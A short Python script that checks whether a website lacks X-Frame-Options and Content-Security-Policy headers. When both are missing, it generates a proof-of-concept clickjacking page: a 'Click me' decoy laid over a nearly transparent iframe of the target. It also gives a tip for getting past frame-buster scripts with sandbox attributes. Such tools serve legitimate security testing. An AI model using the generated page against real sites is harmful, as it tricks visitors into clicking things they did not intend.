import requests


def create_PoC(url: str) -> dict:
    PoC = f"""
            <!DOCTYPE HTML>
            <html>
               <head><title>Clickjack test page</title></head>
               <body>
                    <div style = "position:absolute; top:470px; left:60px; z-index: 1;">Click me</div>
                    <iframe src="{url}" style = "position:relative; width: 500px; height: 700px; opacity: 0.1; z-index: 2;"></iframe>
               </body>
            </html>
            """
    return {"poc": PoC, "note": "[+] Note: If the page can't be framed due to Frame Buster Script try to add sandbox='allow-forms', sandbox='allow-scripts' into iframe tag"}


def clickjacking(url: str, PoC_Script: bool) -> dict:
    headers = requests.get(url).headers
    return_dict = {}
    if "X-Frame-Options" not in headers and "Content-Security-Policy" not in headers:
        return_dict["vulnerable"] = True
        return_dict["message"] = "[+] Potential clickjacking"
        if PoC_Script:
            return_dict = {**return_dict, **create_PoC(url)}
    else:
        return_dict["vulnerable"] = False
        return_dict["message"] = "[-] may be not vulnerable to clickjacking"
    return return_dict


if __name__ == "__main__":
    url = input("Enter the target URL: ")
    PoC_Script = int(
        input("Create an Exploit Script for PoC? 1 for ok 0 for no: "))
    print(clickjacking(url, PoC_Script))
